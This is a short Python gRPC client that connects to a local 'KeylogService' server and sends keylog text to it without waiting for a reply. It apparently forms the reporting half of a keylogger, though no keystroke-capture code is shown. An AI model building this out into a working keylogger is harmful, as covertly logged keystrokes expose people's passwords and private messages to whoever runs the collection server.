import grpc
import protos.server_pb2 as keylog_pb2
import protos.server_pb2_grpc as keylog_pb2_grpc

# CONNECT TO SERVER
channel = grpc.insecure_channel("127.0.0.1:50051")
stub = keylog_pb2_grpc.KeylogServiceStub(channel)

def send_key_non_blocking(text):
    """
    Send keylog to the server WITHOUT WAITING for response.
    """
    # Fire-and-forget RPC call
    stub.SendKeylog.future(keylog_pb2.KeylogRequest(message=text))
